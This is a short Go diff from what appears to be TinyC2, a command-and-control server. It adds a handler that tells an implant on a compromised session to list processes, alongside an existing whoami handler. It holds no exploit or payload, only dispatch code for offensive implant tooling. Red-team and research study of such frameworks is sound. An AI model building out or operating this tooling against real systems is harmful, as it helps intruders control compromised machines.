@@ -2,6 +2,7 @@ package handlers
 
 import (
 	"strconv"
+
 	"github.com/0xPrimo/TinyC2/server/internal/core"
 	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"
 )
@@ -88,6 +89,9 @@ func HandleImplantChannel(engine *core.Engine, session *uint32, args []string) {
 }
 
 func HandleImplantWhoami(engine *core.Engine, session *uint32, args []string) {
-	// execute whoami command
 	engine.ImplantWhoami(*session)
+}
+
+func HandleImplantPs(engine *core.Engine, session *uint32, args []string) {
+	engine.ImplantPs(*session)
 }
